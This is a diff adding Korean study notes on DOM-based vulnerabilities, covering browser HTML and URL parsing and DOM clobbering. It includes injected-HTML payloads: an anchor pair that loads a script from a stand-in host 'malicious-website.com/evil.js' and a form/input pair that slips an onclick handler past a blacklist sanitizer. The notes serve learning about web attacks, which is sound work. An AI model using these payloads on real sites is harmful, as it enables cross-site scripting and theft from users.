@@ -58,6 +58,47 @@ DOM 기반 취약점은 서버가 아니라 **브라우저에서 실행되는 Ja
 | 서비스 거부           | `RegExp()`                 |
 
 
+### 브라우저의 동작
+
+#### HTML 파싱 
+
+HTML 파서가 하는 일 
+- 토큰화: `<a href="x">` → `[시작태그 a]`, `[속성 href]`, `[값 x]`
+- 트리 구축: 토큰을 DOM 노드로 만들어 부모-자식 관계로 연결
+- 엔티티 디코딩: `&quot;` → `"`, `&amp;` → `&`
+- 따옴표 처리: `href="..."` vs `href='...'` vs `href=...` 구분
+- 에러 복구: 닫히지 않은 태그, 잘못된 중첩 등을 브라우저가 임의로 처리
+- 암묵적 태그 삽입: `<table><tr>` → `<tbody>` 자동 삽입
+
+HTML 파싱이 일어나는 시점
+1. **초기 문서 로드(네비게이션)**: 브라우저가 서버로부터 HTML 문서를 받으면 네트워크에서 데이터가 도착하는 즉시 파싱을 시작함. 
+	- 참고: `<script>` 태그를 만나면 파싱이 일시 중단되고 해당 스크립트를 실행 후 재개됨. 따라서 스크립트 실행 시점에 DOM이 완성되지 않았을 수 있음. 
+
+2. **`innerHTML` / `outerHTML` / `insertAdjacentHTML()` 실행**: JavaScript에서 `element.innerHTML = '...'`와 같이 HTML 문자열을 할당하면, 브라우저는 할당된 문자열을 즉시 HTML로 파싱하여 DOM에 반영
+
+3. **DOM API를 통한 요소 생성**
+	- 예: `document.createElement()`, `document.body.appendChild()` 등
+
+
+#### URL 처리
+
+**URL 파싱**: 하나의 긴 문자열로 이루어진 웹 주소(URL)를 프로토콜, 호스트, 포트, 경로, 쿼리 스트링 등 각각의 의미 있는 구성 요소로 쪼개고 분석하는 과정
+**URL 인코딩**: 웹 주소에 사용할 수 없는 문자(한글, 공백 등)를 컴퓨터가 이해하는 안전한 기호로 변환하는 것 
+
+URL 파싱이 일어나는 시점
+1. 네비게이션: 주소창 입력, 링크 클릭 등
+2. 리소스 로드: `src`, `href` 속성 등
+3. DOM 속성 접근 (`.src`, `.href`): `<a>` 요소의 `.href` 프로퍼티에 접근하면, 브라우저는 **저장된 문자열을 URL로 파싱한 결과**를 반환
+``` js
+const a = document.createElement('a');
+a.setAttribute('href', 'x"onerror=alert()');
+console.log(a.getAttribute('href')); // 'x"onerror=alert()' (raw)
+console.log(a.href); // 'https://.../x%22onerror=alert()' (파싱됨)
+```
+
+4. `fetch()`, `XMLHttpRequest.open()`: 네트워크 API에 전달된 URL 요청도 보내기 전에 URL 파서를 거침. 
+
+
 ### DOM 기반 XSS
 
 [[01-XSS#DOM 기반 XSS]]
@@ -352,5 +393,109 @@ DOM 기반 XPath 삽입 취약점은 공격자가 제어할 수 있는 데이터
 document.evaluate()
 element.evaluate()
 ```
+
+
+### DOM 클로버링
+
+DOM 클로버링은 페이지에 HTML 요소를 삽입하여 Javascript의 객체(전역 변수)를 덮어쓰는 공격
+
+**브라우저의 규칙**
+HTML 요소에 `id`, `name` 속성이 있으면 그 이름으로 `window` 객체의 속성을 자동 생성함. 
+예: 페이지에 이런 HTML이 있는 경우 JS에서 `window.myLink`로 접근이 가능함. 
+``` html
+<a id="myLink" href="https://example.com">링크</a>
+```
+
+``` js
+window.myLink        // → <a> 요소
+window.myLink.href   // → "https://example.com"
+```
+
+**`a`를 이용한 공격**
+취약한 코드 
+``` html
+<script>
+    window.onload = function(){
+	    // someObject 객체의 url을 읽어서 스크립트 URL로 사용하는 코드
+        let someObject = window.someObject || {};
+        let script = document.createElement('script');
+        script.src = someObject.url;   // 🚨 여기가 핵심
+        document.body.appendChild(script);
+    };
+</script> 
+```
+
+공격자가 삽입하는 HTML
+``` html
+<a id=someObject>
+<a id=someObject name=url href=//malicious-website.com/evil.js>
+```
+
+동작 과정
+1. 브라우저 규칙에 따라 `id=someObject`인 요소가 생김.
+2. 같은 id가 2개면 컬렉션이 됨. (`a` 태그는 컬렉션이어야 다음 요소를 `id` 또는 `name`으로 접근 가능, named getter가 없음.)
+``` js
+window.someObject           // → HTMLCollection [<a>, <a>]
+window.someObject[0]        // → 첫 번째 <a>
+window.someObject[1]        // → 두 번째 <a>
+```
+
+3. `name=url`로 인해 `window.someObject.url`가 두번째 `<a>`를 가리킴.
+``` js
+window.someObject.url       // → 두 번째 <a> 요소
+```
+
+4. `script.src`는 문자열을 기대하는 속성이므로 자동 타입 변환을 함. 
+``` js
+script.src = someObject.url;
+// 내부적으로 이렇게 동작:
+script.src = String(someObject.url);
+// = someObject.url.toString();
+// = someObject.url.href <-- <a> 요소의 toString()은 href를 반환
+```
+
+5. 공격자가 지정한 URL을 가진 외부 스크립트를 삽입할 수 있음. 
+	- `<script>` 같은 태그가 필요없고 CSP도 우회가 가능함. 
+
+
+
+**`form`을 이용한 공격**
+
+필터가 `form.attributes`를 검사하려고 하는데, `<input id=attributes>`가 그 속성을 가로채서 필터가 `onclick`을 못 보게 만드는 공격
+
+클라이언트 측 HTML 필터 예시
+``` js
+function sanitize(element) {
+    for (let i = 0; i < element.attributes.length; i++) {
+        let attr = element.attributes[i];
+        if (BLACKLIST.includes(attr.name)) {
+            element.removeAttribute(attr.name);  // onclick 등 제거
+        }
+    }
+    // 자식 요소들도 재귀적으로 검사
+    for (let child of element.children) {
+        sanitize(child);
+    }
+}
+```
+
+**정상 동작**: `<form onclick=alert(1)>`이 들어오면:
+- `form.attributes` = `NamedNodeMap [onclick]`
+- `form.attributes.length` = `1`
+- 루프 실행 → `onclick` 발견 → 제거됨 
+
+
+공격자가 삽입하는 HTML 
+``` html
+<form onclick=alert(1)><input id=attributes>Click me
+```
+
+동작 과정: 
+- `form`은 기본적으로 이름으로 자손 요소에 접근이 가능함. (named getter)
+	`form.someName`으로 접근하면:
+	1. form의 **자손 요소 중** `id` 또는 `name`이 `someName`인 것을 찾아서 반환
+	2. 없으면 **내장 속성**으로 폴백
+
+- 공격자가 저 HTML을 삽입하면 필터에서 `form.attributes`가 `<input id=attributes>`을 가리키게 되고 필터를 우회함. 
 
 
